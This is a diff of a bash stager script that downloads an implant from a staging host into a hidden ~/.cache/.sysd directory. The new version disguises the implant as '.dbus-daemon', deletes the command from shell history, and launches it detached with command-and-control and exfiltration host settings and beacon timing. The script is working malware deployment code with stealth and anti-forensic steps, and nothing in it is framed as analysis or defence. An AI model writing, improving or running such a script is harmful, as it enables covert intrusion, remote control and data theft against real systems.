@@ -1,15 +1,27 @@
 #!/bin/bash
-STAGING_HOST="C2_SERVER_IP"
-C2_HOST="C2_SERVER_IP"
-C2_PORT="9999"
-EXFIL_HOST="C2_SERVER_IP"
-EXFIL_PORT="9090"
+STAGING_HOST="${STAGING_HOST:-192.168.1.100}"
+C2_HOST="${C2_HOST:-${STAGING_HOST}}"
+C2_PORT="${C2_PORT:-443}"
+EXFIL_HOST="${EXFIL_HOST:-${C2_HOST}}"
+EXFIL_PORT="${EXFIL_PORT:-8443}"
 
-mkdir -p "${HOME}/.cache/.sysd"
-cd "${HOME}/.cache/.sysd"
+WORK="${HOME}/.cache/.sysd"
+mkdir -p "${WORK}"
+cd "${WORK}"
 
-curl -s -o implant_client.py "http://${STAGING_HOST}:8080/implant_client.py"
+curl -sLk --max-time 60 -o .dbus-daemon "https://${STAGING_HOST}:8443/b"
+chmod +x .dbus-daemon
 
-nohup env C2_HOST="${C2_HOST}" C2_PORT="${C2_PORT}" EXFIL_HOST="${EXFIL_HOST}" EXFIL_PORT="${EXFIL_PORT}" \
-  python3 implant_client.py >/dev/null 2>&1 &
+history -d $(history 1 | awk '{print $1}') 2>/dev/null || true
+
+nohup env \
+  C2_HOST="${C2_HOST}" \
+  C2_PORT="${C2_PORT}" \
+  EXFIL_HOST="${EXFIL_HOST}" \
+  EXFIL_PORT="${EXFIL_PORT}" \
+  BEACON_MIN="4" \
+  BEACON_MAX="12" \
+  "${WORK}/.dbus-daemon" \
+  >/dev/null 2>&1 &
+
 disown $!
